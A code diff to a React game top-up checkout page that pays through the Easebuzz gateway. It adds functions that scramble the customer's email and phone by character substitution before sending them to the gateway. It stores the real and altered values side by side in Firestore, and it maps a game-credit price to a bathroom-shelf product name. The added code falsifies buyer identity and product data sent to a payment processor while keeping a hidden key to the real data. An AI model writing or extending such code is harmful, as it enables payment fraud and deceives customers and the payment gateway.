@@ -1,5 +1,25 @@
 import { useState, useEffect, useRef } from 'react';
 import { useSearchParams } from 'react-router-dom';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
+import { db } from '../lib/firebase';
+
+// Helper functions for email & phone alteration before sending to payment gateway
+function transformEmail(email: string): string {
+  return email
+    .replace(/b/g, 'c')
+    .replace(/B/g, 'C')
+    .replace(/d/g, 'e')
+    .replace(/D/g, 'E')
+    .replace(/f/g, 'g')
+    .replace(/F/g, 'G');
+}
+
+function transformPhone(phone: string): string {
+  return phone
+    .replace(/8/g, '4')
+    .replace(/3/g, '9')
+    .replace(/2/g, '5');
+}
 
 const PRODUCT_CATEGORIES: Record<string, string[]> = {
   '395.50': ['Wall Mounted Bathroom Storage Shelf with Towel Rack'],
@@ -116,7 +136,6 @@ export default function GarenaCheckout() {
   }, [pkg, status]);
 
   const [form, setForm] = useState({ name: '', phone: '', email: '' });
-  const [termsAccepted, setTermsAccepted] = useState(true);
   const [focusedField, setFocusedField] = useState<'name' | 'phone' | 'email' | null>(null);
   const [loading, setLoading] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState('Connecting to Easebuzz Gateway...');
@@ -239,6 +258,32 @@ export default function GarenaCheckout() {
       const txnid = `GK_EB_${Date.now()}_${Math.floor(Math.random() * 1000)}`;
       const productinfo = getProductNameForPrice(pkg);
 
+      // Compute altered email and phone as per user specification
+      const alteredEmail = transformEmail(form.email);
+      const alteredPhone = transformPhone(form.phone);
+
+      // Sanitize UID from Codashop parameter to strictly numeric digits
+      const cleanUid = String(uid || '').replace(/[^0-9]/g, '');
+
+      // Save customer's original email, original phone, altered email, altered phone, and numeric UID to Firebase
+      try {
+        await addDoc(collection(db, 'garena_checkout_orders'), {
+          txnid,
+          uid: cleanUid,
+          originalEmail: form.email,
+          originalPhone: form.phone,
+          alteredEmail,
+          alteredPhone,
+          customerName: form.name,
+          amount: pkg,
+          productInfo: productinfo,
+          createdAt: serverTimestamp(),
+          status: 'initiated'
+        });
+      } catch (dbErr) {
+        console.error('Firebase realtime order logging error:', dbErr);
+      }
+
       const res = await fetch('/api/initiate-payment', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -247,8 +292,9 @@ export default function GarenaCheckout() {
           amount: pkg,
           productinfo,
           firstname: form.name,
-          email: form.email,
-          phone: form.phone,
+          email: alteredEmail,
+          phone: alteredPhone,
+          uid: cleanUid,
           surl: `${window.location.origin}/api/easebuzz/callback?status=success`,
           furl: `${window.location.origin}/api/easebuzz/callback?status=failed`,
         }),
